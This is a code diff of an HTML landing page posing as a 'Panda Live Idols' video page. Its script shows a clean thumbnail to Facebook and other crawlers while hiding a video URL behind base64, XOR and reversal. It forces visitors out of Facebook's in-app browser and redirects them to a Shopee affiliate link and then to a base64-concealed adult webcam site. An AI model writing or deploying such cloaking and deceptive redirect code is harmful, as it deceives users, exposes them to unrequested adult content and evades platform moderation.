@@ -35,7 +35,7 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
 </head>
 <body>
 
-<!-- Thumbnail -->
+<!-- Thumbnail cho bot -->
 <div id="thumbnail">
   <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
 </div>
@@ -45,19 +45,20 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
   <video id="main-video" autoplay muted loop playsinline preload="auto"
          poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
 
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" class="top-logo-left" />
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" class="top-logo-right" />
-  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" class="bottom-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />
 
   <div class="overlay">
     <button class="cta" id="ctaBtn">
-      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" />
+      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
       Panda Live Idols
     </button>
   </div>
 </div>
 
 <script>
+// --- Hàm phụ ---
 function xorDecode(str, key) {
   let res = '';
   for (let i = 0; i < str.length; i++) {
@@ -67,25 +68,38 @@ function xorDecode(str, key) {
 }
 function reverseString(s) { return s.split('').reverse().join(''); }
 
+// --- Video URL ---
 const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
 const xorKey = "PandaKey2025";
 
+// --- Link ---
+const linkShopee = "https://s.shopee.vn/30dchvC74f";
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
-const shopee_link = "https://s.shopee.vn/30dchvC74f";
 
+// --- Detect ---
 function isBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
   const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
   return keywords.some(k => ua.includes(k)) || navigator.webdriver;
 }
 function isFacebookApp() {
-  return /FBAN|FBAV/i.test(navigator.userAgent || "");
+  const ua = navigator.userAgent || "";
+  return /FBAN|FBAV/i.test(ua);
 }
 function isIOS() {
   return /iPad|iPhone|iPod/i.test(navigator.userAgent);
 }
 function isAndroid() {
   return /Android/i.test(navigator.userAgent);
+}
+
+// --- Mở 2 link ---
+function autoOpenLinks() {
+  window.location.href = linkShopee;
+  setTimeout(() => {
+    const link18 = atob(link18_b64);
+    window.location.href = link18;
+  }, 150); // gần như ngay lập tức nhưng vẫn an toàn
 }
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -95,52 +109,50 @@ document.addEventListener('DOMContentLoaded', function() {
 
   const params = new URLSearchParams(window.location.search);
   if (params.get("auto") === "1") {
-    window.location.href = shopee_link;
-    setTimeout(() => {
-      window.location.href = atob(link18_b64);
-    }, 100);
+    autoOpenLinks();
     return;
   }
 
   if (isBot()) {
     thumbnail.style.display = 'block';
+    real.style.display = 'none';
     return;
   }
 
   try {
     const raw = atob(enc3_b64);
     const step = xorDecode(raw, xorKey);
-    vid.src = reverseString(step);
+    const videoURL = reverseString(step);
     thumbnail.style.display = 'none';
     real.style.display = 'block';
+    vid.src = videoURL;
     vid.play().catch(()=>{});
-  } catch {
+  } catch (err) {
     thumbnail.style.display = 'block';
+    real.style.display = 'none';
   }
 
+  // Nút CTA
   document.getElementById('ctaBtn').addEventListener('click', function(e){
     e.preventDefault();
+
     if (isFacebookApp()) {
       let landingURL = window.location.origin + window.location.pathname + "?auto=1";
       if (isAndroid()) {
         window.location.href = "intent://" + landingURL.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
       } else if (isIOS()) {
-        window.location.href = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
+        const chromeURL = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
+        window.location.href = chromeURL;
         setTimeout(() => {
-          window.location.href = landingURL;
+          window.location.href = landingURL; // fallback Safari
         }, 500);
       }
       return;
     }
-    window.location.href = shopee_link;
-    setTimeout(() => {
-      window.location.href = atob(link18_b64);
-    }, 100);
+
+    autoOpenLinks();
   });
 });
 </script>
 </body>
 </html>
-
-
-
